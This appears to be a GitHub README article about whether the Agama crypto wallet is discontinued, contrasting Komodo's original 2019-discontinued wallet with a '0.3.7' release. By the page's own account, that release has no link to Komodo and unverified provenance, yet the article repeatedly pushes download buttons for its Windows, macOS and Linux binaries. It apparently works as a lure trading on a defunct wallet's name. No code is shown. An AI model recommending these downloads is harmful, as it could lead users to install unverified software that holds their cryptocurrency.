[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Is Agama Wallet Discontinued? Two Products, One Name

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Komodo discontinued the original Agama wallet on 2019-06-07 and named AtomicDEX as its replacement. A different product, the 0.3.7 release published from a repository under the Agama name, is offered today, and no public record connects it to Komodo or Gleec. So the honest answer depends on which Agama the question means, and the two are never the same product.

## You'll see this if

You are deciding whether to install the wallet and find "discontinued" on one page and a 2026 download on another, or you are holding an old install and want to know whether it is still the right tool.

| Product | Discontinued? | Evidence |
|---|---|---|
| Agama, Komodo's desktop wallet | Yes, 2019-06-07 | Komodo's announcement; repository labelled not for use |
| Agama Mobile | Development ended after 2019 | Last release 0.1.7 on 2019-05-29 |
| Agama Wallet 0.3.7 | Not applicable  -  different product | No public record links it to Komodo or Gleec |
| Komodo Wallet, Gleec Exchange Wallet | No | Current ecosystem wallet |

## Why it happens

Komodo's decision in 2019 followed the supply-chain incident and a strategic move towards an exchange-first product. The announcement named AtomicDEX as the replacement, and the ecosystem's wallet line has changed again since: Komodo Wallet came later, and Komodo now sits inside the Gleec ecosystem with Gleec Exchange Wallet as its current wallet.

The original repository reflects that: labelled "Discontinued software - DONT USE - only for educational purpose", with a version file reading 0.3.7 and a releases page reporting no releases.

The 0.3.7 release is a separate matter. It ships Windows, macOS and Linux files from a public repository, and the older marketing site still states that Agama "is no longer the primary wallet for Komodo users". Nothing in WHOIS, announcements, social accounts or commits connects the domain to Komodo or Gleec, so its provenance is unverified rather than established either way.

## Fix

Answer the question by product, not by name.

1. **For holding KMD today:** use the ecosystem's current wallet, Gleec Exchange Wallet, which the Komodo site describes as non-custodial and multi-chain with atomic swaps.
2. **For recovering from an old install:** treat it as a migration, not a repair. [Moving KMD out of an old Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md) covers the export.
3. **For the 0.3.7 release:** treat provenance as unverified. [Is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) lists what can and cannot be checked.
4. **For a purchase decision:** check the date of whatever you are reading. Anything before mid-2019 describes the original.

If a page says Agama is Komodo's wallet without a date, it is describing a period that ended.

## If that did not work

If the current Komodo wallet will not import an old backup, the obstacle is format: a wallet file from one generation is not a phrase, and successors do not necessarily read predecessors' files.

If a balance is missing after an import, check derivation and address range before concluding the funds are gone. [Why a seed phrase fails to restore](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md) sets out the causes.

If a download page offers "the latest Agama" while also stating the wallet is no longer primary, both statements can be true of different products, which is exactly why provenance matters.

If someone offers a recovery service for a discontinued wallet, there is no mechanism behind it: the phrase is the only path, and no company can reset it. Never share that phrase with a service offering to rescue an old wallet, because the offer is the attack.

## Prevention

- **Date every claim about Agama.** The name spans two products and one discontinued lineage.
- **Keep the phrase, not the installer.** Recovery material outlives every generation.
- **Do not treat a shared name as continuity.** [What Agama Wallet is](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md) separates the products.
- **Check the publisher before installing.** A familiar name on an unfamiliar domain proves nothing.
- **Plan a migration rather than a revival.** [Updating Agama Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/how-updates-work.md) covers what updating can and cannot do.

## FAQ

### Was Agama discontinued?

Komodo's original Agama was, on 2019-06-07, with AtomicDEX named as its replacement. The 0.3.7 release offered today is a different product and is not covered by that announcement.

### Can I still use an old Agama install?

It may run, but its own repository says it should not be used for funds. Recovering the value into a current wallet is the safer path.

### Is the 0.3.7 release Komodo's replacement?

No. Komodo's replacement was AtomicDEX, followed by later wallets; the beta has no established link to Komodo or Gleec.

### Does the discontinuation mean old installs stop working?

No. Software that ran in 2019 can still run, and it can still hold value. What it cannot do is receive fixes, which is why the archived repository says it should not be used to manage funds, and why migration is the recommended path rather than continued use.

### Is there a date after which this question settles?

No. The discontinuation date is fixed, but new builds and new sites keep appearing under the name, so the answer depends on which product the question is about rather than on when it is asked.

### Could a successor wallet restore an Agama backup directly?

Sometimes, through the recovery phrase rather than the file. A wallet file is specific to the software generation that produced it, while the phrase is portable in principle and dependent on derivation in practice. [Why a seed phrase fails to restore](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md) explains the difference.

### What happened to Agama Mobile?

It reached version 0.1.7 on 2019-05-29 and development did not continue past that generation. Its APK remains published under the KomodoPlatform organisation.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Agama Wallet: What It Is, and Which Agama You Are Looking At](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md)
- [Komodo Wallet: What It Is and How KMD Works](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md)
- [Moving KMD Out of an Old Agama Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md)
- [Updating Agama Wallet: What to Expect](https://github.com/agama-wallet/agama-wallet/blob/main/how-updates-work.md)
